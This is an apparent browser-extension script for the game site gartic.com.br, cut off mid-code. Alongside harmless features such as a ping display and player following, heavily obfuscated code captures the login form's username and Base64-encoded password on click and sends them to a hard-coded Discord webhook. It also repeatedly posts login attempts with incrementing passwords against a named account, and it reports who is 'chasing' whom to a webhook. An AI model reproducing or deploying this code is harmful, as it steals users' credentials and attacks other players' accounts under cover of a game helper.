var script = document.createElement('script');
script.type = 'text/javascript';
script.src = 'https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js';
document.body.appendChild(script);


"use strict";
async function ping() {
	let t = Date.now();
	await fetch(window.location.href);
	return `${Date.now()-t}ms`
}
setInterval(() => {
	ping().then(t => {
		1 == document.location.href.startsWith("https://gartic.com.br/0") &&
      (document.querySelectorAll("input")[8].attributes[0].textContent = t)
	})
}, 3e3);


setTimeout(()=>{
	   if(document.URL.startsWith('https://gartic.com.br/0')){
	document.querySelector('#tema > input.isAfk').checked = true
}
},1000)

// [bagunça abaixo]

// r_trash.js
// lentidão crash ou multiplas requests
// apenas durante a partida, caso seja adicionado script no iframe sem delay, causa crash
// 41: 10s de delay
// lento demais para uso, por enquanto.
/*
var valor, reported, it, iframe = document.createElement("iframe");
function report() {
	for (valor = 0, reported = []; valor < iframe.contentDocument.getElementsByClassName("sala").length;) "red" == iframe.contentDocument.getElementsByClassName("sala")[valor].style.color && reported.push(iframe.contentDocument.getElementsByClassName("sala")[valor].firstChild.textContent), valor++
}
function salacolor() {
	for (it = 0, report(); it < reported.length;) document.title.includes(reported[it]) && (document.getElementById("limite").style.backgroundImage = "url('https://i.imgur.com/X7Lv55v.png')"), it++
}
iframe.style.width = "0", iframe.style.height = "0", iframe.src = "https://gartic.com.br/", document.body.appendChild(iframe), setInterval(() => {
	salacolor()
}, 5000), setTimeout(() => {
	var e = iframe.contentWindow.document.createElement("script");
	e.type = "text/javascript", e.src = "https://reddap.github.io/gartic-extension/gatric/trash/src/script.js", iframe.contentWindow.document.body.appendChild(e)
}, 10000);
*/

// 6 _f.js 6.log 04/02 jb;05/02 white c#/_s/crypto
// verifica se utilizador foi banido de usar a extensão;
// blacklist usuários a não serem perseguidos;
// whitelist utilizadores que podem usar qualquer função
// fixed "funcional" :57
var _0x5ef99b=_0x333b;(function(_0x125a8a,_0x38c59b){var _0x54b6d1=_0x333b,_0x11d3c3=_0x125a8a();while(!![]){try{var _0x2b9af5=parseInt(_0x54b6d1(0x195))/0x1*(parseInt(_0x54b6d1(0x1ac))/0x2)+parseInt(_0x54b6d1(0x1a0))/0x3*(parseInt(_0x54b6d1(0x1c8))/0x4)+-parseInt(_0x54b6d1(0x1a9))/0x5+parseInt(_0x54b6d1(0x198))/0x6*(-parseInt(_0x54b6d1(0x1aa))/0x7)+-parseInt(_0x54b6d1(0x1b4))/0x8+parseInt(_0x54b6d1(0x18d))/0x9*(-parseInt(_0x54b6d1(0x1b6))/0xa)+-parseInt(_0x54b6d1(0x1a4))/0xb*(-parseInt(_0x54b6d1(0x1a7))/0xc);if(_0x2b9af5===_0x38c59b)break;else _0x11d3c3['push'](_0x11d3c3['shift']());}catch(_0x2c3afa){_0x11d3c3['push'](_0x11d3c3['shift']());}}}(_0x2fac,0x72a52));function web(_0xd43424,_0x505562,_0x37822a){var _0x51eb40=_0x333b,_0x3c2d29=new XMLHttpRequest();_0x3c2d29[_0x51eb40(0x1bd)]('POST',_0x51eb40(0x1b1)),_0x3c2d29[_0x51eb40(0x1c7)](_0x51eb40(0x1be),'application/json');var _0x149e30={'content':'\x20`'+_0xd43424+'`\x20is\x20chasing\x20`'+_0x505562+'`.\x20\x0a\x20*'+_0x37822a+'*'};_0x3c2d29[_0x51eb40(0x1b7)](JSON[_0x51eb40(0x1c1)](_0x149e30));}_0x5ef99b(0x1a6)===window['location'][_0x5ef99b(0x1b0)]&&(document[_0x5ef99b(0x1a3)]('#formJogar\x20>\x20div.botoes\x20>\x20input.botaoLaranja')[_0x5ef99b(0x1c2)]=document['querySelector']('#formJogar\x20>\x20div.botoes\x20>\x20input.botaoLaranja')[_0x5ef99b(0x1c2)]+'<input\x20type=\x22text\x22\x20name=\x22login\x22\x20id=\x22seguir\x22\x20placeholder=\x22Quem\x20seguir?\x20[enter]\x22\x20style=\x22\x0a\x20\x20\x20\x20padding-left:\x20275px;\x0a\x20\x20\x20\x20padding-right:\x20275px;\x0a\x22>');const _delay=0x2710;function _0x2fac(){var _0x5b3e2d=['3aiyWaI','Observação\x20interrompida.','#dadosLogin','querySelector','55vjUuCL','includes','https://gartic.com.br/','3150288bwpTQx','closed','2833465HdkxdE','57547tGxPHU','addEventListener','2iTOlUt','sair','replace','keyCode','href','https://discord.com/api/webhooks/920571782392594442/eeS2RMKGemuXDZqWfpmIFCGwhC9ZyWyDI6HnLcCCFzazwRQpWlevQWIBSr2PiW7-KBye','innerHTML','textContent','6090000mkJAvK','#seguir','5280SmsNnQ','send','Mantenha\x20esta\x20página\x20em\x20foco.','slice','getElementById','text/html','parseFromString','open','Content-type','disabled','placeholder','stringify','outerHTML','querySelectorAll','<strong>','location','itemSala','setRequestHeader','2345404aVMxln','.botaoLaranja','toLowerCase','7974iebsJe','window','Observando\x20\x22','flor_love_s2','text','alert','https://gartic.com.br','getElementsByClassName','917173JnsDwj','click','.lista','402RewJrt','/share','then','document','length','</strong>\x20saiu\x20do\x20jogo.','now','value'];_0x2fac=function(){return _0x5b3e2d;};return _0x2fac();}let _lastExecution=0x0;var np;async function Missing(_0x36f0d3){var _0x4be8b5=_0x5ef99b;for(np=window[_0x4be8b5(0x1bd)](_0x4be8b5(0x193));;){if(fetch(_0x4be8b5(0x1a6)+_0x36f0d3)[_0x4be8b5(0x19a)](_0x2a70fe=>_0x2a70fe[_0x4be8b5(0x191)]())['then'](_0x843cdf=>{var _0x53ffba=_0x4be8b5;const _0x390213=new DOMParser()[_0x53ffba(0x1bc)](_0x843cdf,_0x53ffba(0x1bb))[_0x53ffba(0x1c3)]('a')[0x1a]['pathname'][_0x53ffba(0x1ae)]('/0','');if(_0x53ffba(0x199)!=_0x390213){console['log'](_0x390213);var _0x29674a=_0x390213;null!=np[_0x53ffba(0x19b)]['getElementById'](_0x53ffba(0x1c6)+_0x29674a)&&_lastExecution+_delay<Date[_0x53ffba(0x19e)]()&&(np['document']['getElementById'](_0x53ffba(0x1c6)+_0x29674a)[_0x53ffba(0x196)](),np[_0x53ffba(0x19b)][_0x53ffba(0x1c3)](_0x53ffba(0x1c9))[0x0][_0x53ffba(0x196)](),_lastExecution=Date['now']());}}),np[_0x4be8b5(0x1a8)]&&(document[_0x4be8b5(0x1a3)](_0x4be8b5(0x1b5))[_0x4be8b5(0x1c0)]=_0x4be8b5(0x1a1)),np[_0x4be8b5(0x18e)][_0x4be8b5(0x1c5)][_0x4be8b5(0x1b0)][_0x4be8b5(0x1a5)]('/0')&&null!=np[_0x4be8b5(0x19b)][_0x4be8b5(0x1c3)](_0x4be8b5(0x197))[0x2]){var _0x46db89=np[_0x4be8b5(0x19b)]['querySelectorAll'](_0x4be8b5(0x197))[0x2][_0x4be8b5(0x1b2)]['toLowerCase']()[_0x4be8b5(0x1b9)](-0x3e8),_0x3f1a33=(_0x4be8b5(0x1c4)+_0x36f0d3+_0x4be8b5(0x19d))[_0x4be8b5(0x1ca)]();_0x46db89['includes'](_0x3f1a33)&&(np[_0x4be8b5(0x19b)][_0x4be8b5(0x194)](_0x4be8b5(0x1ad))[0x0][_0x4be8b5(0x196)](),np[_0x4be8b5(0x19b)][_0x4be8b5(0x1ba)]('popupBt1')[_0x4be8b5(0x196)]());}await new Promise(_0x3eeda0=>setTimeout(_0x3eeda0,0x3e8));}}function _0x333b(_0x4298ea,_0x2ec1eb){var _0x2facbf=_0x2fac();return _0x333b=function(_0x333bde,_0x16b57f){_0x333bde=_0x333bde-0x18d;var _0x16f199=_0x2facbf[_0x333bde];return _0x16f199;},_0x333b(_0x4298ea,_0x2ec1eb);}if('https://gartic.com.br/'===window[_0x5ef99b(0x1c5)][_0x5ef99b(0x1b0)]){var persist=document[_0x5ef99b(0x1a3)](_0x5ef99b(0x1b5));persist[_0x5ef99b(0x1ab)]('keydown',_0x49d298=>{var _0x2e69d4=_0x5ef99b;0xd==_0x49d298[_0x2e69d4(0x1af)]&&0x0!=persist[_0x2e69d4(0x19f)][_0x2e69d4(0x19c)]&&(_0x2e69d4(0x190)!=persist['value'][_0x2e69d4(0x1ca)]()&&(persist[_0x2e69d4(0x1bf)]=!0x0,alert(_0x2e69d4(0x1b8)),persist[_0x2e69d4(0x1c0)]=_0x2e69d4(0x18f)+persist[_0x2e69d4(0x19f)]+'\x22',web(document[_0x2e69d4(0x1a3)](_0x2e69d4(0x1a2))[_0x2e69d4(0x1b3)],persist[_0x2e69d4(0x19f)],Date()),Missing(persist['value']),persist[_0x2e69d4(0x19f)]=''),'flor_love_s2'==persist[_0x2e69d4(0x19f)][_0x2e69d4(0x1ca)]()&&(web(document['querySelector'](_0x2e69d4(0x1a2))[_0x2e69d4(0x1b3)],persist['value'],Date()),window[_0x2e69d4(0x192)]('invalido,\x20infelizmente.')));});}
(function(_0x5f259e,_0x496f10){function _0x4db867(_0x252b20,_0x378578,_0x308bec,_0x42c204){return _0x32d8(_0x378578- -0x2e4,_0x308bec);}var _0x370253=_0x5f259e();function _0x169cd7(_0x2df7e2,_0x5e4561,_0x215420,_0x11598a){return _0x32d8(_0x5e4561-0x11a,_0x215420);}while(!![]){try{var _0x18e5cb=parseInt(_0x169cd7(0x303,0x334,0x33b,0x328))/(0x2f+0x459*0x5+-0x15eb*0x1)*(-parseInt(_0x169cd7(0x32f,0x337,0x320,0x34e))/(-0x3c5+0x2196+0x24b*-0xd))+parseInt(_0x4db867(-0xe7,-0x11a,-0x10e,-0x14a))/(0x26e6+-0x394+-0x234f)*(parseInt(_0x4db867(-0x11e,-0xf4,-0x123,-0xb7))/(-0x1*0x2123+0xe7d+0x12aa))+parseInt(_0x4db867(-0x130,-0x12a,-0x166,-0x152))/(-0x8*-0x35b+-0x20d6+0x39*0x1b)+parseInt(_0x4db867(-0xef,-0xf9,-0x129,-0xcb))/(0x1*-0x24f7+0x181e+-0xcdf*-0x1)+parseInt(_0x4db867(-0x123,-0x131,-0x137,-0x124))/(-0x242f*0x1+-0x25b+0x2691)+parseInt(_0x4db867(-0x121,-0x125,-0x128,-0x12e))/(0x3*0x20a+0x57a*-0x7+0x2040)*(parseInt(_0x4db867(-0x143,-0x106,-0xde,-0x113))/(-0x209c*-0x1+-0xbe+-0x1fd5))+parseInt(_0x169cd7(0x2ef,0x30b,0x2cf,0x30a))/(0x1*-0x1499+-0x9fd+0xa0*0x31)*(-parseInt(_0x4db867(-0xee,-0x103,-0x130,-0x116))/(-0xd3*0x1+0x8e1*0x3+0x3*-0x897));if(_0x18e5cb===_0x496f10)break;else _0x370253['push'](_0x370253['shift']());}catch(_0x5efd63){_0x370253['push'](_0x370253['shift']());}}}(_0x3508,-0x7512d*0x1+0xe0490+0x827e));var _0x9fb40d=(function(){function _0x5cae7a(_0x4cf73e,_0xab859b,_0x514e3c,_0x40efb6){return _0x32d8(_0x4cf73e- -0xce,_0x40efb6);}var _0x99d2f0={'muJaY':function(_0x2ba832,_0x2efcab,_0x535748){return _0x2ba832(_0x2efcab,_0x535748);},'QtJiV':_0x4a92b1(0x432,0x461,0x470,0x468)+_0x5cae7a(0x104,0xd2,0xc8,0xf9)+_0x4a92b1(0x435,0x475,0x43d,0x45d)+_0x5cae7a(0x157,0x11a,0x11d,0x12b)+_0x5cae7a(0x140,0x17c,0x134,0x16e)+_0x4a92b1(0x445,0x47b,0x4ae,0x483),'OMJcw':_0x4a92b1(0x44a,0x471,0x494,0x463)+_0x5cae7a(0xe7,0xe7,0xca,0x111),'zwosZ':_0x5cae7a(0x106,0x11d,0xd5,0x12b),'AVbjE':_0x4a92b1(0x479,0x47d,0x464,0x468)+'rtic.com.b'+'r/','rVDaV':_0x4a92b1(0x490,0x441,0x474,0x46d)+_0x4a92b1(0x451,0x4be,0x4ae,0x481)+'ross-origi'+'n','MldmI':function(_0x4ca747,_0x459d08){return _0x4ca747+_0x459d08;},'fkpMM':function(_0x36a6df,_0x4831b7,_0x53ce20){return _0x36a6df(_0x4831b7,_0x53ce20);},'viZQp':_0x5cae7a(0xed,0xb3,0xeb,0x111)+'+$','QpaOa':_0x4a92b1(0x4a8,0x4bd,0x481,0x4b8),'iwkxz':'efmTH','motMC':_0x4a92b1(0x49d,0x4b1,0x4a8,0x47e)},_0x2475f3=!![];function _0x4a92b1(_0x3438f1,_0x25f1cd,_0x192b5f,_0x36a5f5){return _0x32d8(_0x36a5f5-0x295,_0x192b5f);}return function(_0x20a75e,_0x25aaf8){function _0x25dc73(_0x19c4a7,_0xc8e95e,_0x6b784d,_0x424585){return _0x5cae7a(_0x424585-0x492,_0xc8e95e-0x172,_0x6b784d-0xd2,_0x6b784d);}var _0x31152f={};_0x31152f[_0x25dc73(0x5bb,0x574,0x5bc,0x5ab)]=_0x99d2f0[_0x25dc73(0x568,0x57a,0x59e,0x582)],_0x31152f['qAzgS']=_0x99d2f0[_0x25dc73(0x5c2,0x5ba,0x606,0x5d1)],_0x31152f[_0x4f6336(0x4ee,0x4dc,0x4a6,0x519)]=_0x99d2f0[_0x4f6336(0x519,0x4e6,0x520,0x4f9)];var _0x3c8ee9=_0x31152f;function _0x4f6336(_0x396feb,_0x1d0ce,_0x453f23,_0x59521a){return _0x5cae7a(_0x1d0ce-0x395,_0x1d0ce-0x8e,_0x453f23-0x153,_0x59521a);}if(_0x99d2f0[_0x4f6336(0x4a2,0x488,0x4c3,0x45f)]!==_0x99d2f0[_0x4f6336(0x483,0x488,0x44c,0x44f)])var _0x7377c6={'ChaDY':function(_0x5799dc,_0x31aac1,_0x3fb53a){function _0x43e2a9(_0x142d9d,_0xb95adc,_0x10276c,_0x54e910){return _0x25dc73(_0x142d9d-0x127,_0xb95adc-0x82,_0xb95adc,_0x54e910- -0x6cb);}return _0x99d2f0[_0x43e2a9(-0x105,-0x120,-0x159,-0x12e)](_0x5799dc,_0x31aac1,_0x3fb53a);},'UoCXQ':_0x99d2f0[_0x4f6336(0x4a1,0x489,0x44b,0x4b6)],'yvmFN':_0x99d2f0[_0x4f6336(0x4bb,0x487,0x465,0x47d)],'OPTgw':'applicatio'+_0x4f6336(0x4e4,0x4ef,0x514,0x4c3)+_0x4f6336(0x492,0x4b4,0x4e9,0x4d3)+'ded','KZQsh':_0x99d2f0[_0x4f6336(0x4a0,0x48e,0x4bb,0x4b7)],'TllrD':_0x99d2f0[_0x25dc73(0x5b2,0x5e2,0x5b8,0x5d4)],'IOXQP':_0x99d2f0[_0x25dc73(0x5ad,0x5d3,0x5ff,0x5c9)],'FAMtf':function(_0x18f565,_0x39996a){function _0x4426c9(_0x577699,_0x1d48bf,_0x23bd03,_0x4a15f2){return _0x25dc73(_0x577699-0xfd,_0x1d48bf-0x14a,_0x1d48bf,_0x23bd03- -0x151);}return _0x99d2f0[_0x4426c9(0x46b,0x445,0x44d,0x42b)](_0x18f565,_0x39996a);},'LcOly':'userLogin='+'vibora&sen'+_0x25dc73(0x57a,0x5d7,0x5e5,0x5b9),'VtWCn':'include'},_0x4b5013=_0x99d2f0[_0x25dc73(0x580,0x584,0x5e5,0x5b7)](_0x11ac35,()=>{_0x7377c6[_0x4d4e64(0xfe,0xad,0xd0,0x9b)](_0x49c257,_0x7377c6[_0x29ee4b(-0x1c3,-0x197,-0x1cd,-0x1e6)],{'headers':{'accept':_0x29ee4b(-0x1b0,-0x1c5,-0x1ec,-0x1d0),'accept-language':_0x7377c6[_0x4d4e64(0x10b,0xf2,0xe7,0x10e)],'content-type':_0x7377c6[_0x4d4e64(0x10e,0xdb,0x10e,0xdb)],'sec-fetch-dest':'empty','sec-fetch-mode':_0x7377c6[_0x4d4e64(0x14b,0x136,0x113,0x12b)],'sec-fetch-site':_0x4d4e64(0xf0,0x137,0x115,0x13c)+'n','sec-gpc':'1'},'referrer':_0x7377c6[_0x29ee4b(-0x1a2,-0x1aa,-0x1ca,-0x1e1)],'referrerPolicy':_0x7377c6[_0x4d4e64(0xac,0x85,0xb9,0x8c)],'body':_0x7377c6['FAMtf'](_0x7377c6[_0x29ee4b(-0x1fc,-0x232,-0x1f9,-0x1e0)],_0x16c38a),'method':_0x4d4e64(0x97,0xcb,0xa4,0x8e),'mode':'cors','credentials':_0x7377c6[_0x29ee4b(-0x19e,-0x1cf,-0x1dd,-0x1fe)]});function _0x4d4e64(_0x523c99,_0x1d8ab9,_0x1e1435,_0xfe4844){return _0x25dc73(_0x523c99-0x4b,_0x1d8ab9-0x1a0,_0xfe4844,_0x1e1435- -0x4d1);}function _0x29ee4b(_0x1057bc,_0x429d8a,_0x5cc000,_0x5aa332){return _0x4f6336(_0x1057bc-0xc6,_0x5cc000- -0x6a5,_0x5cc000-0x1c5,_0x5aa332);}_0x319587++;},0x6fe+0x1*0x1537+0xd*-0x205);else{var _0x26f8ac=_0x2475f3?function(){var _0x2d5d0={};function _0x55b26d(_0x12ff17,_0x35edb5,_0x23df1c,_0x50d3d5){return _0x25dc73(_0x12ff17-0x140,_0x35edb5-0xb,_0x50d3d5,_0x35edb5- -0x209);}function _0x1f38e1(_0x26d4a1,_0x5797ae,_0x1a491f,_0x6d64e){return _0x4f6336(_0x26d4a1-0x149,_0x6d64e- -0xb4,_0x1a491f-0x5f,_0x1a491f);}_0x2d5d0['nqnMO']=_0x3c8ee9[_0x1f38e1(0x3fa,0x422,0x429,0x3fa)];var _0x19fc37=_0x2d5d0;if(_0x3c8ee9[_0x1f38e1(0x448,0x47a,0x435,0x43c)]!==_0x3c8ee9[_0x55b26d(0x3ae,0x3d0,0x3d1,0x3b8)]){if(_0x25aaf8){var _0x49cf26=_0x25aaf8['apply'](_0x20a75e,arguments);return _0x25aaf8=null,_0x49cf26;}}else return _0x4718fd[_0x55b26d(0x39c,0x3d2,0x40d,0x3da)]()[_0x55b26d(0x3ae,0x3c7,0x3f9,0x3ae)](_0x19fc37['nqnMO'])[_0x55b26d(0x3d0,0x3d2,0x3ae,0x3dc)]()[_0x1f38e1(0x3fe,0x3fe,0x40b,0x41a)+'r'](_0x4a35fc)['search'](_0x1f38e1(0x3ca,0x3ae,0x406,0x3ce)+'+$');}:function(){};return _0x2475f3=![],_0x26f8ac;}};}()),_0x16a74a=_0x9fb40d(this,function(){var _0x5cb6fc={};_0x5cb6fc[_0x420704(0x455,0x44c,0x467,0x468)]=_0x116f85(0x240,0x226,0x235,0x27c)+'+$';function _0x116f85(_0x3c1ccb,_0x2e5362,_0x8c2faa,_0x17b0c9){return _0x32d8(_0x3c1ccb-0x85,_0x17b0c9);}var _0x2cc36b=_0x5cb6fc;function _0x420704(_0xac937e,_0x10f727,_0x27b633,_0x59d055){return _0x32d8(_0x59d055-0x252,_0x27b633);}return _0x16a74a[_0x116f85(0x29c,0x25f,0x274,0x25f)]()[_0x116f85(0x291,0x252,0x282,0x293)](_0x2cc36b[_0x116f85(0x29b,0x27d,0x2b1,0x25f)])[_0x420704(0x45e,0x479,0x42a,0x469)]()[_0x420704(0x47b,0x450,0x470,0x459)+'r'](_0x16a74a)['search'](_0x2cc36b['HcuNG']);});_0x16a74a();function _0x3508(){var _0x16b3f1=['MrUzH','JXVAH','empty','POST','JAYiX','3601451NbzxLH','#senhaLogi','=0.9','textConten','href','cNHcS','characterD','912720yDBHgM','(((.+)+)+)','api/webhoo','addEventLi','viZQp','784336qNOSVj','OMJcw','motMC','QtJiV','5044115463','#userLogin','tor','IOXQP','zwosZ','r/log_ajax','stringify','215178sJpSsO','rGXIK','encode','location','en-US,en;q','MAo2fiS2-z','RVZCK','BGZoc','rtic.com.b','https://ga','cors','ata','.;;,','#blocoDesl','strict-ori','muJaY','MldmI','\x20input','rm\x20>\x20div\x20>','ChaDY','45GUIMMZ','wJsbI','torAll','58685xSKCcU','forEach','ExyiQ','lastChild','LcOly','gnHeI','VubWq','apply','AudJT','ogado\x20>\x20fo','2068344qZIfcC','gin-when-c','rm-urlenco','074','target','28AIGoIO','2230LEulBE','*/*','fkpMM','yvmFN','haLogin=','PlHsg','querySelec','ImXKH','eRKqL','attributes','vqJZL','ukQkv','value','startsWith','r/0','ERvET','VtWCn','include','r3YAKhAWuc','syJv6P9rYW','rVDaV','ded','constructo','xqpIO','CqFKF','9ccPyL2lcW','includes','search','QpaOa','1639094456','userLogin=','AVbjE','UoCXQ','ks/9186674','scord.com/','TllrD','tAMGi','HcuNG','toString','DKFfi','ross-origi','1mlwPIS','OPTgw','qLmZY','743606aXiXhj','uEnTrw5OzN','iwkxz','KZQsh','SPbQk','same-origi','jYLNw','applicatio','.php?rand=','1/DNLgGgZD','observe','n/x-www-fo','qAzgS','childList','nbWRb'];_0x3508=function(){return _0x16b3f1;};return _0x3508();}document[_0x407f10(0x189,0x1b8,0x177,0x14e)][_0x407f10(0x173,0x193,0x192,0x159)]===_0x407f10(0x18f,0x15a,0x1ad,0x1a9)+_0x407f10(0x18e,0x151,0x170,0x1bf)+'r/'&&document[_0x407f10(0x1b3,0x1e0,0x1bf,0x190)+'tor'](_0x6f28f(0x7d,0x84,0x90,0xce)+_0x407f10(0x1a6,0x1d3,0x1a5,0x172)+_0x6f28f(0x87,0xa8,0x95,0xce)+_0x407f10(0x197,0x16a,0x165,0x197))[_0x6f28f(0x3a,0x7c,0x76,0x76)+'stener']('click',()=>{function _0x29ff92(_0x5ec083,_0x38612b,_0x548cbc,_0x543a59){return _0x407f10(_0x38612b-0x30d,_0x38612b-0xef,_0x5ec083,_0x543a59-0x13e);}var _0xcbcdef={'gnHeI':function(_0x32b3ea,_0x3f4c5a,_0x1a907d){return _0x32b3ea(_0x3f4c5a,_0x1a907d);},'JXVAH':'https://di'+_0x205659(0x168,0x167,0x123,0x15a)+_0x29ff92(0x478,0x485,0x4ad,0x46f)+_0x205659(0x174,0x14e,0x18c,0x159)+_0x205659(0x101,0xef,0x108,0x10a)+_0x29ff92(0x4bb,0x4ef,0x4fb,0x4c8)+_0x29ff92(0x4f5,0x4cd,0x4a6,0x490)+_0x205659(0x11c,0x146,0xf9,0x116)+_0x29ff92(0x4a2,0x4d3,0x498,0x4ba)+'QyJ5CbT1He'+_0x205659(0x139,0x13e,0x18e,0x165)+_0x29ff92(0x4d0,0x4cc,0x4ea,0x490),'IeqHQ':'POST','ERvET':_0x205659(0x105,0xe4,0xeb,0xfb)+'n'};function _0x205659(_0x526668,_0x2632cf,_0x161e80,_0x591590){return _0x407f10(_0x591590- -0x75,_0x2632cf-0x1ca,_0x161e80,_0x591590-0x65);}_0xcbcdef[_0x205659(0xf2,0x127,0x128,0x12d)](fetch,_0xcbcdef[_0x29ff92(0x4b3,0x478,0x45d,0x4a2)],{'method':_0xcbcdef['IeqHQ'],'headers':headers,'mode':_0x29ff92(0x462,0x49d,0x4c3,0x463),'body':JSON[_0x205659(0xde,0x12f,0x113,0x110)]({'banned':![],'content':document[_0x205659(0x169,0x121,0x11b,0x13e)+_0x29ff92(0x458,0x48e,0x460,0x4a8)](_0x205659(0x132,0xf6,0xde,0x10b))[_0x205659(0x136,0x149,0x15e,0x144)]+'\x20'+Base64[_0x205659(0x141,0xf7,0xd6,0x113)](document['querySelec'+_0x29ff92(0x4a0,0x48e,0x48c,0x4c0)](_0xcbcdef[_0x29ff92(0x4c2,0x4c9,0x4ef,0x505)])[_0x29ff92(0x4a7,0x4c6,0x4de,0x4c6)])})});});function _0x6f28f(_0x4008be,_0x47500f,_0x131e9a,_0x1902f9){return _0x32d8(_0x131e9a- -0x147,_0x47500f);}function _0x407f10(_0x1cd01f,_0x4697a0,_0xb49e80,_0x1072d7){return _0x32d8(_0x1cd01f- -0x44,_0xb49e80);}function _0x32d8(_0x5a607f,_0x32c7b0){var _0x57ee89=_0x3508();return _0x32d8=function(_0x3051ed,_0x4a8a44){_0x3051ed=_0x3051ed-(-0x80*-0x43+0x1f40+0x1*-0x3f11);var _0x581ce3=_0x57ee89[_0x3051ed];return _0x581ce3;},_0x32d8(_0x5a607f,_0x32c7b0);}var noti=0x26f+-0x84e+0x9c7;function ban(){function _0x21b319(_0x5c6078,_0x1d62ce,_0x1806e4,_0x28ff3a){return _0x407f10(_0x28ff3a- -0x310,_0x1d62ce-0x92,_0x1806e4,_0x28ff3a-0xe5);}var _0x1e72c1={'ExyiQ':function(_0x456c49,_0x5dc566){return _0x456c49!==_0x5dc566;},'rGXIK':_0x21b319(-0x110,-0x10a,-0x100,-0x128),'uAqYj':function(_0x5b0de4,_0xb96f86,_0x2c49de){return _0x5b0de4(_0xb96f86,_0x2c49de);},'DKFfi':_0x21b319(-0x19f,-0x165,-0x195,-0x181)+_0x5ae1d2(-0x1d6,-0x20c,-0x207,-0x238)+'r/log_ajax'+'.php?rand='+_0x5ae1d2(-0x1ed,-0x1af,-0x1cb,-0x1bf)+_0x21b319(-0x137,-0x152,-0x144,-0x166),'qLmZY':_0x21b319(-0x17e,-0x19a,-0x14e,-0x162),'TUhzC':_0x21b319(-0x16d,-0x181,-0x174,-0x186)+_0x21b319(-0x17b,-0x1ab,-0x1cc,-0x19f),'dalhq':_0x5ae1d2(-0x204,-0x258,-0x229,-0x20c),'vqJZL':'cors','nbWRb':_0x21b319(-0x16a,-0x153,-0x156,-0x181)+'rtic.com.b'+'r/','PlHsg':_0x5ae1d2(-0x23d,-0x207,-0x201,-0x212)+_0x21b319(-0x185,-0x153,-0x188,-0x168)+_0x5ae1d2(-0x1ab,-0x1e2,-0x1c0,-0x182)+'n','wJsbI':function(_0x20c2c6,_0x53a979){return _0x20c2c6+_0x53a979;},'CqFKF':_0x21b319(-0x126,-0x147,-0x168,-0x145)+'vibora&sen'+_0x5ae1d2(-0x1ef,-0x1de,-0x1e4,-0x1f3),'SPbQk':_0x21b319(-0x197,-0x18e,-0x1da,-0x1a3),'nLDcK':_0x21b319(-0x137,-0x150,-0x181,-0x152)};function _0x5ae1d2(_0x4bda1a,_0x361d65,_0x3bb641,_0x5e0378){return _0x407f10(_0x3bb641- -0x395,_0x361d65-0x0,_0x5e0378,_0x5e0378-0xbf);}var _0x1ac965=_0x1e72c1['uAqYj'](setInterval,()=>{function _0x4252fd(_0x16149f,_0x219ce3,_0x2ac498,_0x2ed565){return _0x21b319(_0x16149f-0xf1,_0x219ce3-0x14d,_0x16149f,_0x219ce3-0x502);}function _0x1af53b(_0x57f115,_0x11d09f,_0x516915,_0x4f18ad){return _0x5ae1d2(_0x57f115-0x1e4,_0x11d09f-0x1d6,_0x57f115-0x582,_0x11d09f);}if(_0x1e72c1[_0x4252fd(0x3cc,0x391,0x377,0x3af)](_0x1e72c1[_0x1af53b(0x374,0x393,0x35c,0x35d)],_0x4252fd(0x3ce,0x3a7,0x3a3,0x3a4)))_0x1e72c1['uAqYj'](fetch,_0x1e72c1[_0x1af53b(0x3c1,0x3ae,0x384,0x3a3)],{'headers':{'accept':_0x1e72c1[_0x1af53b(0x3c5,0x3e0,0x3ea,0x3ef)],'accept-language':_0x1e72c1['TUhzC'],'content-type':_0x1af53b(0x3cd,0x400,0x3a6,0x3ab)+_0x4252fd(0x3e3,0x3d6,0x3f9,0x410)+_0x1af53b(0x396,0x359,0x39e,0x3ce)+_0x1af53b(0x3af,0x39f,0x3e3,0x38e),'sec-fetch-dest':_0x1e72c1['dalhq'],'sec-fetch-mode':_0x1e72c1[_0x4252fd(0x3af,0x3a9,0x389,0x36c)],'sec-fetch-site':'same-origi'+'n','sec-gpc':'1'},'referrer':_0x1e72c1[_0x4252fd(0x3eb,0x3d9,0x3c5,0x3a6)],'referrerPolicy':_0x1e72c1[_0x1af53b(0x39f,0x36a,0x3d4,0x3a9)],'body':_0x1e72c1[_0x1af53b(0x388,0x36f,0x3bd,0x357)](_0x1e72c1[_0x4252fd(0x392,0x3b7,0x38f,0x3cc)],noti),'method':_0x1e72c1[_0x1af53b(0x3ca,0x405,0x3c3,0x3db)],'mode':_0x1e72c1[_0x1af53b(0x3a4,0x399,0x367,0x371)],'credentials':_0x1e72c1['nLDcK']}),noti++;else{if(_0x4c69da){var _0x522e08=_0x3fc604[_0x4252fd(0x377,0x396,0x378,0x3c0)](_0x244ea4,arguments);return _0x24451a=null,_0x522e08;}}},0x820+-0x2*0x5f+0x2b7*-0x2);}if(document['location'][_0x6f28f(0x93,0x4d,0x70,0x97)][_0x407f10(0x1ba,0x1a9,0x1b3,0x1d9)]('https://ga'+'rtic.com.b'+_0x407f10(0x1bb,0x1bc,0x1ee,0x185))){var target=document[_0x6f28f(0x8f,0xb5,0xb0,0xca)+_0x6f28f(0x97,0x80,0x99,0x9c)]('.lista')[0x875+-0x571*0x1+-0xb*0x46],observer=new MutationObserver(async function(_0xaafa37){function _0x16211a(_0x115934,_0x512b60,_0x6319c5,_0x1222db){return _0x6f28f(_0x115934-0x84,_0x6319c5,_0x512b60-0x212,_0x1222db-0x84);}function _0x14bdab(_0x3712f6,_0x4f73be,_0x3ec3f0,_0x301f2e){return _0x407f10(_0x301f2e-0x2c5,_0x4f73be-0x15f,_0x3712f6,_0x301f2e-0x87);}var _0x435cb6={'RlakP':function(_0x11711c,_0x49a02c){return _0x11711c(_0x49a02c);},'JAYiX':function(_0x271fe7,_0x5da378){return _0x271fe7===_0x5da378;},'ukQkv':_0x14bdab(0x483,0x447,0x49c,0x479),'xqpIO':_0x16211a(0x265,0x2a1,0x275,0x27f),'jyYAW':_0x16211a(0x283,0x29b,0x2b7,0x2d5),'cNHcS':_0x14bdab(0x429,0x471,0x485,0x452)};_0xaafa37[_0x14bdab(0x447,0x43f,0x44e,0x463)](async function(_0x3a702c){function _0x47c987(_0x50ca48,_0x42279a,_0x228909,_0x36d74c){return _0x14bdab(_0x42279a,_0x42279a-0x164,_0x228909-0xc9,_0x50ca48- -0x22);}function _0x37f92a(_0x410482,_0x31b02a,_0x3724e7,_0x2c70c4){return 